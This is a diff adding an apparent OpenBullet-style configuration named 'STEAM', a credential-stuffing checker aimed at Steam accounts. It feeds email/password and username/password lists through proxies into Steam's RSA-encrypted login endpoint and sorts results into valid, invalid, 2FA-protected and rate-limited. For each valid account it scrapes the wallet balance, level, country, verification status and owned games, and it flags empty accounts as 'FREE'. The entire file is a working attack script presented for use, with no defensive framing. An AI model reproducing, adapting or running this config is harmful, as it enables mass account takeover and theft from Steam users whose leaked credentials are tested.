@@ -1,0 +1,151 @@
+[SETTINGS]
+{
+  "Name": "STEAM ",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get REQUEST GET "https://store.steampowered.com/api/mobileversion/v0001?app_name=ios" 
+  
+  HEADER "User-Agent: Steam 2.0.20 / iPhone" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true,\"latestversion" 
+
+#post REQUEST POST "https://steamcommunity.com/login/getrsakey/" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+
+PARSE "<SOURCE>" LR ",\"publickey_mod\":\"" "\",\"" -> VAR "" 
+
+#EXP PARSE "<SOURCE>" LR "publickey_exp\":\"" "\",\"" -> VAR "EXP" 
+
+#TIMESTAMP PARSE "<SOURCE>" LR "timestamp\":\"" "\",\"" -> VAR "TIMESTAMP" 
+
+#KEYFIX FUNCTION RSAEncrypt "<KEY>" "<EXP>" "<PASS>" -> VAR "KEYFIX" 
+
+#URL FUNCTION URLEncode "<KEYFIX>" -> VAR "URL" 
+
+#Login REQUEST POST "https://steamcommunity.com/login/dologin/" EncodeContent=TRUE 
+  CONTENT "donotcache=<DONO>&password=<KEYFIX>&username=<USER>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<TIMESTAMP>&remember_login=false&oauth_client_id=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Origin: https://steamcommunity.com" 
+  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect account name or password." 
+    KEY "The account name or password that you have entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY ",\"requires_twofactor\":true" 
+    KEY "emailauth_needed\":true" 
+  KEYCHAIN Retry OR 
+    KEY "There have been too many login failures from your network in a short time period. Please wait and try again later" 
+
+#2FA PARSE "<SOURCE>" LR ",\"requires_twofactor\":" ",\"" -> VAR "2FA" 
+
+#Steam_ID PARSE "<SOURCE>" LR "steamid\":\"" "\",\"" -> VAR "Steam ID" 
+
+#2FA_off FUNCTION Replace "false" "Off" "<2FA>" -> CAP "2FA" 
+
+#2FA_on FUNCTION Replace "true" "on" "<2FA>" -> CAP "2FA" 
+
+#Capture REQUEST GET "https://steamcommunity.com/profiles/<Steam ID>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Level PARSE "<SOURCE>" LR "\"><span class=\"friendPlayerLevelNum\">" "</span></div></div>" -> CAP "Level" 
+
+#Capture REQUEST GET "https://store.steampowered.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Balance PARSE "<SOURCE>" LR "<div class=\"accountData price\">" "</div>" -> CAP "Balance" 
+
+#Verified PARSE "<SOURCE>" LR "1543\">" "</a>" -> CAP "Verified Status" 
+
+#Country PARSE "<SOURCE>" LR "<span class=\"account_data_field\">" "</span>" -> CAP "Country" 
+
+#Capture REQUEST GET "https://steamcommunity.com/profiles/<Steam ID>/games/?tab=all" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Games PARSE "<SOURCE>" LR "var rgGames =" "var rgChangingGames =" -> VAR "Games Function" 
+
+#Count_Games FUNCTION CountOccurrences ",\"name\":\"" "<Games Function>" -> CAP "Total Games" 
+
+#Games PARSE "<SOURCE>" LR ",\"name\":\"" "\",\"" -> CAP "Games" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<div class=\"accountData price\">0" 
+    KEY "<SOURCE>" DoesNotContain ",\"name\":\"" 
+
